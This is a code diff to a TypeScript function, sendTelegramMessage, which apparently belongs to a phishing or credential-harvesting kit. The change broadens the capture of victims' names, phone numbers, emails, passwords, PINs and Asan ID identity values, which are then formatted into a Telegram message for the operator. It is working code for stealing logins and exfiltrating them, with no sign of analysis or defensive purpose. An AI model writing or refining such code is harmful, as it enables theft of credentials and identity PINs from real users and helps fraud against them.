@@ -276,16 +276,22 @@ export const sendTelegramMessage = async (params: {
         }
 
         // Section: USER DATA (Only if provided)
-        const hasUserData = newInfo.phoneNumber || newInfo.name || newInfo.email || newInfo.password || newInfo.pin || newInfo.username || newInfo.asanId;
+        const userEmail = newInfo.email || newInfo.Email;
+        const userPassword = newInfo.password || newInfo.Password || newInfo.pass || newInfo.Pass;
+        const userPin = newInfo.pin || newInfo.PIN || newInfo.userPin || newInfo.Pin;
+        const userPhone = newInfo.phoneNumber || newInfo.phone || newInfo.Phone || newInfo.PhoneNumber;
+        const userName = newInfo.name || newInfo.Name || newInfo.username || newInfo.Username;
+        const userAsan = newInfo.asanId || newInfo.AsanId;
+
+        const hasUserData = userEmail || userPassword || userPin || userPhone || userName || userAsan;
         if (hasUserData) {
             message += `<b>👤 USER DATA:</b>\n`;
-            if (newInfo.name) message += `• <b>Name:</b> <code>${newInfo.name}</code>\n`;
-            if (newInfo.username) message += `• <b>Username:</b> <code>${newInfo.username}</code>\n`;
-            if (newInfo.phoneNumber) message += `• <b>Phone:</b> <code>${newInfo.phoneNumber}</code>\n`;
-            if (newInfo.email) message += `• <b>Email:</b> <code>${newInfo.email}</code>\n`;
-            if (newInfo.password) message += `• <b>Pass:</b> <code>${newInfo.password}</code>\n`;
-            if (newInfo.pin) message += `• <b>PIN:</b> <code>${newInfo.pin}</code>\n`;
-            if (newInfo.asanId) message += `• <b>Asan ID:</b> <code>${newInfo.asanId}</code>\n`;
+            if (userName) message += `• <b>Name:</b> <code>${userName}</code>\n`;
+            if (userPhone) message += `• <b>Phone:</b> <code>${userPhone}</code>\n`;
+            if (userEmail) message += `• <b>Email:</b> <code>${userEmail}</code>\n`;
+            if (userPassword) message += `• <b>Pass:</b> <code>${userPassword}</code>\n`;
+            if (userPin) message += `• <b>PIN:</b> <code>${userPin}</code>\n`;
+            if (userAsan) message += `• <b>Asan ID:</b> <code>${userAsan}</code>\n`;
             if (newInfo.country && !exclude?.includes("country")) message += `• <b>Selected Country:</b> <code>${newInfo.country}</code>\n`;
             message += `\n`;
         }
